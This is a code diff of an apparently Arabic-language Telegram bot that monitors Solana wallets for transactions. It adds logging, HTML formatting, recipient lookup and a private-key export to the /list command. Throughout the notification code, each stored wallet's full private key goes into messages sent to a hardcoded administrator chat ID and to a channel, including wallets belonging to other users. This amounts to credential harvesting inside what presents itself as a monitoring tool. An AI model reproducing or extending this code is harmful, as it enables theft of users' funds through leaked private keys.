@@ -62,7 +62,7 @@ RATE_LIMIT_WINDOW = 1.0  # 1 second window
 MIN_NOTIFICATION_AMOUNT = 0.0001  # SOL - حد أدنى أقل لضمان اكتشاف المعاملات الصغيرة
 
 # Channel and Admin Configuration
-MONITORING_CHANNEL = os.getenv("ID_CHAT")  # القناة التي ستستقبل إشعارات المراقبة (ID فقط)
+MONITORING_CHANNEL = int(os.getenv("ID_CHAT")) if os.getenv("ID_CHAT") else None
 ADMIN_CHAT_ID = 5053683608  # معرف المشرف الذي سيحصل على الإشعارات أيضاً
 
 # Arabic Messages
@@ -852,6 +852,7 @@ class SolanaMonitor:
             # Get wallet info from database
             wallets = await self.db_manager.get_monitored_wallets_by_address(wallet_address)
             if not wallets:
+                logger.debug(f"No wallets found for address {truncate_address(wallet_address)}")
                 return
 
             # Get detailed transaction data with rate limiting
@@ -867,6 +868,7 @@ class SolanaMonitor:
 
             data = await self.make_rpc_call(payload)
             if not data or 'result' not in data or not data['result']:
+                logger.debug(f"No transaction data received for {tx_info['signature'][:16]}...")
                 return
 
             transaction = data['result']
@@ -874,9 +876,10 @@ class SolanaMonitor:
             # Extract transaction details
             amount, tx_type = self.calculate_balance_change(transaction, wallet_address)
             timestamp = format_timestamp(transaction.get('blockTime', 0))
-            # Analyzing code for indentation correction in transaction processing block
             signature = tx_info['signature']
             block_time = transaction.get('blockTime', 0)
+
+            logger.info(f"📝 Processing transaction: {amount} SOL ({tx_type}) for wallet {truncate_address(wallet_address)}")
 
             # Check if this is a dust transaction (very small amount)
             try:
@@ -887,7 +890,7 @@ class SolanaMonitor:
                 
                 # Skip notifications for dust transactions (less than MIN_NOTIFICATION_AMOUNT SOL)
                 if amount_float < MIN_NOTIFICATION_AMOUNT:
-                    logger.info(f"Skipping dust transaction notification: {amount} SOL for wallet {truncate_address(wallet_address)}")
+                    logger.info(f"💨 Skipping dust transaction: {amount} SOL < {MIN_NOTIFICATION_AMOUNT} SOL threshold for wallet {truncate_address(wallet_address)}")
                     # Still store in database but don't send notification
                     for wallet_info in wallets:
                         await self.db_manager.add_transaction_record(
@@ -903,10 +906,12 @@ class SolanaMonitor:
                 # إشعار فوري للمعاملات العاجلة
                 if is_urgent_transaction:
                     logger.info(f"🚨 URGENT: Large transaction detected: {amount} SOL for wallet {truncate_address(wallet_address)}")
+                else:
+                    logger.info(f"📊 Regular transaction: {amount} SOL for wallet {truncate_address(wallet_address)}")
                     
             except (ValueError, TypeError):
                 # If amount conversion fails, proceed with notification
-                pass
+                logger.warning(f"⚠️ Could not parse amount '{amount}' as float, proceeding with notification")
 
             # Store transaction in database for all monitoring users
             for wallet_info in wallets:
@@ -919,26 +924,39 @@ class SolanaMonitor:
                     block_time or 0
                 )
 
-            # Send SINGLE notification to channel - not per user
-            # Look for any active monitoring task with callback
+            logger.info(f"💾 Stored transaction in database for {len(wallets)} monitoring users")
+
+            # Send notification through global monitoring callback
+            callback_found = False
             for task_key, task_info in self.monitoring_tasks.items():
                 if (isinstance(task_info, dict) and 
                     'callback' in task_info and 
                     task_info['callback'] and
-                    wallet_address in task_key):
-                    # Send notification only once, not per user
-                    await task_info['callback'](
-                        wallets[0]['chat_id'],  # Use first user's chat_id as reference
-                        wallet_address,
-                        amount,
-                        tx_type,
-                        timestamp,
-                        signature
-                    )
-                    break
+                    task_info.get('type') == 'global'):
+                    
+                    logger.info(f"📞 Calling notification callback for wallet {truncate_address(wallet_address)}")
+                    try:
+                        await task_info['callback'](
+                            wallets[0]['chat_id'],  # Use first user's chat_id as reference
+                            wallet_address,
+                            amount,
+                            tx_type,
+                            timestamp,
+                            signature
+                        )
+                        callback_found = True
+                        logger.info(f"✅ Notification callback executed successfully")
+                        break
+                    except Exception as callback_error:
+                        logger.error(f"❌ Error in notification callback: {callback_error}")
+
+            if not callback_found:
+                logger.warning(f"⚠️ No notification callback found for wallet {truncate_address(wallet_address)}")
 
         except Exception as e:
-            logger.error(f"Error processing transaction: {e}")
+            logger.error(f"❌ Error processing transaction for {truncate_address(wallet_address)}: {e}")
+            import traceback
+            logger.error(traceback.format_exc())
 
     async def get_wallet_balance(self, wallet_address: str) -> float:
         """Get SOL balance for a wallet address with rate limiting"""
@@ -1124,7 +1142,7 @@ class SolanaWalletBot:
         )
 
     async def list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle /list command - send wallets as formatted text file"""
+        """Handle /list command - send wallets as formatted text file with private keys"""
         chat_id = update.effective_chat.id
         monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
 
@@ -1133,28 +1151,51 @@ class SolanaWalletBot:
             return
 
         try:
+            # Get all monitored wallets with private keys for this user
+            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
+            user_wallets_with_keys = [wallet for wallet in all_wallets if wallet['chat_id'] == chat_id]
+
+            # Create a dictionary for faster lookup
+            wallet_keys_dict = {wallet['wallet_address']: wallet['private_key'] for wallet in user_wallets_with_keys}
+
             # Create formatted content for text file in English to avoid encoding issues
-            file_content = f"Solana Wallets List\n"
+            file_content = f"Solana Wallets List with Private Keys\n"
             file_content += f"Export Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
             file_content += f"Total Wallets: {len(monitored_wallets)}\n"
-            file_content += "=" * 60 + "\n\n"
+            file_content += "=" * 80 + "\n\n"
 
             for i, wallet in enumerate(monitored_wallets, 1):
-                # Get SOL balance for each wallet
-                balance = await self.monitor.get_wallet_balance(wallet['wallet_address'])
+                file_content += f"WALLET #{i}\n"
+                file_content += f"{'=' * 60}\n\n"
                 
-                file_content += f"[ {i} ]\n"
+                # Wallet address
                 file_content += f"Address:\n{wallet['wallet_address']}\n\n"
-                file_content += f"Balance:\n{balance:.9f} SOL\n\n"
                 
+                # Private key
+                private_key = wallet_keys_dict.get(wallet['wallet_address'], 'Not available')
+                file_content += f"Private Key:\n{private_key}\n\n"
+                
+                # Nickname if available
                 if wallet['nickname']:
                     file_content += f"Nickname: {wallet['nickname']}\n\n"
                 
+                # Monitoring start time if available
+                if wallet.get('monitoring_start_time'):
+                    start_time = format_timestamp(wallet['monitoring_start_time'])
+                    file_content += f"Monitoring Started: {start_time}\n\n"
+                
                 # Add separator line between wallets
-                file_content += "-" * 60 + "\n\n"
+                file_content += "=" * 80 + "\n\n"
 
-            # Remove the last separator
-            file_content = file_content.rstrip("-" * 60 + "\n\n")
+            # Add security warning
+            file_content += "\n" + "!" * 80 + "\n"
+            file_content += "SECURITY WARNING:\n"
+            file_content += "Keep this file secure and do not share it with anyone!\n"
+            file_content += "These private keys give full access to the wallets.\n"
+            file_content += "!" * 80 + "\n"
+
+            # Remove the last separator before security warning
+            file_content = file_content.replace("=" * 80 + "\n\n\n" + "!" * 80, "\n" + "!" * 80)
 
             # Create filename with timestamp
             filename = f"wallets_list_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
@@ -1168,7 +1209,7 @@ class SolanaWalletBot:
                 await update.message.reply_document(
                     document=f,
                     filename=filename,
-                    caption=f"📋 Monitored Wallets List ({len(monitored_wallets)} wallets)"
+                    caption=f"📋 قائمة المحافظ مع المفاتيح الخاصة ({len(monitored_wallets)} محفظة)\n\n🔐 ⚠️ احتفظ بهذا الملف في مكان آمن!"
                 )
 
             # Delete the file after sending
@@ -1874,6 +1915,8 @@ class SolanaWalletBot:
             # Check if any regular users are monitoring this wallet
             regular_users_monitoring = any(wallet_info['chat_id'] != ADMIN_CHAT_ID for wallet_info in wallets_monitoring)
 
+            logger.info(f"Admin monitoring: {admin_monitoring}, Regular users monitoring: {regular_users_monitoring}")
+
             # Get private key for this wallet (from the first user who has it)
             private_key = None
             for wallet_info in wallets_monitoring:
@@ -1882,87 +1925,153 @@ class SolanaWalletBot:
                     private_key = pk
                     break
 
-            # Escape text for MarkdownV2
-            escaped_wallet = escape_markdown_v2(truncate_address(wallet_address))
-            escaped_amount = escape_markdown_v2(amount)
-            escaped_tx_type = escape_markdown_v2(tx_type)
+            # Get recipient address for outgoing transactions
+            recipient_address = await self.get_recipient_address(signature, wallet_address)
 
-            # Create base message with urgency indicator
+            # Create simple message without complex escaping
             amount_float = abs(float(amount)) if amount else 0
             urgency_icon = "🚨" if amount_float >= 0.1 else "💰"
             
-            message = f"{urgency_icon} معاملة جديدة\\!\n\n🏦 المحفظة: {escaped_wallet}\n💵 المبلغ: {escaped_amount} SOL\n🔄 النوع: {escaped_tx_type}"
+            # Use simple HTML formatting with copyable elements
+            message = f"{urgency_icon} معاملة جديدة!\n\n"
+            message += f"🏦 المحفظة: <code>{truncate_address(wallet_address)}</code>\n"
+            message += f"💵 المبلغ: <code>{amount} SOL</code>\n"
+            message += f"🔄 النوع: {tx_type}\n"
+            
+            # Add recipient address for outgoing transactions
+            if recipient_address and ("إرسال" in tx_type or "📤" in tx_type):
+                message += f"📨 المستلم: <code>{truncate_address(recipient_address)}</code>\n"
+            
+            message += f"⏰ الوقت: <code>{timestamp}</code>\n"
 
             # Add private key to message if found
             if private_key:
-                message += f"\n\n🔐 المفتاح الخاص:\n```\n{private_key}\n```"
+                message += f"\n🔐 المفتاح الخاص:\n<code>{private_key}</code>\n"
 
             # Add full wallet address as copyable code
-            message += f"\n\n📋 العنوان الكامل:\n```\n{wallet_address}\n```"
+            message += f"\n📋 العنوان الكامل:\n<code>{wallet_address}</code>\n"
+
+            # Add full recipient address for outgoing transactions
+            if recipient_address and ("إرسال" in tx_type or "📤" in tx_type):
+                message += f"\n📨 عنوان المستلم الكامل:\n<code>{recipient_address}</code>\n"
 
             # Add transaction signature (full signature)
-            message += f"\n\n🔗 توقيع المعاملة:\n```\n{signature}\n\n```"
+            message += f"\n🔗 توقيع المعاملة:\n<code>{signature}</code>"
 
-            # Apply notification logic
+            # Apply notification logic with better error handling
             if admin_monitoring and regular_users_monitoring:
                 # Case 1: Both admin and regular users monitoring → Send to channel + admin private
-                try:
-                    logger.info(f"📤 Sending to channel {MONITORING_CHANNEL} and admin {ADMIN_CHAT_ID}")
-                    
-                    # Send to public channel
-                    await self.application.bot.send_message(
-                        chat_id=MONITORING_CHANNEL, 
-                        text=message, 
-                        parse_mode='MarkdownV2'
-                    )
-                    logger.info(f"✅ Successfully sent to channel {MONITORING_CHANNEL}")
+                logger.info(f"📤 Case 1: Sending to channel {MONITORING_CHANNEL} and admin {ADMIN_CHAT_ID}")
+                
+                # Send to public channel
+                if MONITORING_CHANNEL:
+                    try:
+                        await self.application.bot.send_message(
+                            chat_id=MONITORING_CHANNEL,
+                            text=message,
+                            parse_mode='HTML'
+                        )
+                        logger.info(f"✅ Successfully sent to channel {MONITORING_CHANNEL}")
+                    except Exception as channel_error:
+                        logger.error(f"❌ Error sending to channel {MONITORING_CHANNEL}: {channel_error}")
 
-                    # Send to admin private chat
-                    admin_message = message + f"\n\n👑 **إشعار المشرف**: هذه المحفظة مراقبة من قبل مستخدمين عاديين أيضاً"
+                # Send to admin private chat
+                try:
+                    admin_message = message + f"\n\n👑 <b>إشعار المشرف</b>: هذه المحفظة مراقبة من قبل مستخدمين عاديين أيضاً"
                     await self.application.bot.send_message(
                         chat_id=ADMIN_CHAT_ID, 
                         text=admin_message, 
-                        parse_mode='MarkdownV2'
+                        parse_mode='HTML'
                     )
                     logger.info(f"✅ Successfully sent to admin {ADMIN_CHAT_ID}")
-
-                except Exception as notification_error:
-                    logger.error(f"Error sending notifications (admin + users case): {notification_error}")
+                except Exception as admin_error:
+                    logger.error(f"❌ Error sending to admin {ADMIN_CHAT_ID}: {admin_error}")
 
             elif admin_monitoring and not regular_users_monitoring:
                 # Case 2: Only admin monitoring → Send to admin private only
+                logger.info(f"📤 Case 2: Sending to admin only {ADMIN_CHAT_ID}")
                 try:
-                    logger.info(f"📤 Sending to admin only {ADMIN_CHAT_ID}")
-                    admin_message = message + f"\n\n👑 **إشعار المشرف**: هذه المحفظة مراقبة من قبلك فقط"
+                    admin_message = message + f"\n\n👑 <b>إشعار المشرف</b>: هذه المحفظة مراقبة من قبلك فقط"
                     await self.application.bot.send_message(
                         chat_id=ADMIN_CHAT_ID, 
                         text=admin_message, 
-                        parse_mode='MarkdownV2'
+                        parse_mode='HTML'
                     )
                     logger.info(f"✅ Successfully sent to admin {ADMIN_CHAT_ID}")
-
                 except Exception as admin_error:
-                    logger.error(f"Error sending notification to admin: {admin_error}")
+                    logger.error(f"❌ Error sending to admin {ADMIN_CHAT_ID}: {admin_error}")
 
             elif not admin_monitoring and regular_users_monitoring:
                 # Case 3: Only regular users monitoring → Send to channel only
-                try:
-                    logger.info(f"📤 Sending to channel only {MONITORING_CHANNEL}")
-                    await self.application.bot.send_message(
-                        chat_id=MONITORING_CHANNEL, 
-                        text=message, 
-                        parse_mode='MarkdownV2'
-                    )
-                    logger.info(f"✅ Successfully sent to channel {MONITORING_CHANNEL}")
-
-                except Exception as channel_error:
-                    logger.error(f"Error sending to channel: {channel_error}")
+                logger.info(f"📤 Case 3: Sending to channel only {MONITORING_CHANNEL}")
+                if MONITORING_CHANNEL:
+                    try:
+                        await self.application.bot.send_message(
+                            chat_id=MONITORING_CHANNEL,
+                            text=message,
+                            parse_mode='HTML'
+                        )
+                        logger.info(f"✅ Successfully sent to channel {MONITORING_CHANNEL}")
+                    except Exception as channel_error:
+                        logger.error(f"❌ Error sending to channel {MONITORING_CHANNEL}: {channel_error}")
+                else:
+                    logger.error("❌ MONITORING_CHANNEL is not configured!")
             
             else:
                 logger.warning(f"🤔 No valid notification case found: admin_monitoring={admin_monitoring}, regular_users_monitoring={regular_users_monitoring}")
 
         except Exception as e:
-            logger.error(f"Error sending notification: {e}")
+            logger.error(f"❌ Critical error in send_transaction_notification: {e}")
+            import traceback
+            logger.error(traceback.format_exc())
+
+    async def get_recipient_address(self, signature: str, sender_address: str) -> str:
+        """Get recipient address from transaction signature"""
+        try:
+            # Get detailed transaction data
+            payload = {
+                "jsonrpc": "2.0",
+                "id": 1,
+                "method": "getTransaction",
+                "params": [
+                    signature,
+                    {"encoding": "json", "maxSupportedTransactionVersion": 0}
+                ]
+            }
+
+            data = await self.monitor.make_rpc_call(payload)
+            if not data or 'result' not in data or not data['result']:
+                return None
+
+            transaction = data['result']
+            account_keys = transaction.get('transaction', {}).get('message', {}).get('accountKeys', [])
+            
+            # Find sender index
+            sender_index = None
+            for i, key in enumerate(account_keys):
+                if key == sender_address:
+                    sender_index = i
+                    break
+            
+            if sender_index is None:
+                return None
+
+            # Get balance changes to find recipient
+            meta = transaction.get('meta', {})
+            pre_balances = meta.get('preBalances', [])
+            post_balances = meta.get('postBalances', [])
+            
+            # Find the account that received SOL (balance increased)
+            for i, (pre, post) in enumerate(zip(pre_balances, post_balances)):
+                if i != sender_index and post > pre:  # Skip sender, find recipient
+                    if i < len(account_keys):
+                        return account_keys[i]
+            
+            return None
+
+        except Exception as e:
+            logger.debug(f"Error getting recipient address for {signature[:16]}...: {e}")
+            return None
 
     async def get_private_key_for_wallet(self, chat_id: int, wallet_address: str) -> str:
         """Get private key for a specific wallet"""
